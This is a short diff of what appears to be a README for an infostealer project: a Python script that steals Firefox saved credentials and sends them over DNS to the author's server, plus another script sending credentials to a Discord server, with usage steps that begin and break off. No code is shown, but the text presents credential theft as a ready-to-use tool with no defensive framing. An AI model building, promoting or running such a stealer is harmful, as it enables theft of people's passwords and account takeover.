@@ -2,7 +2,7 @@
 
 A cool python script that opens a dns server and a firefox saved credentails stealer script which sends the creds using dns(udp) protocl to our server.
 
-Another script which sends creds to a discord server 
+Another script which sends creds to a discord server (tcp-https)
 
 How to use
 1. run server.py file on the server 
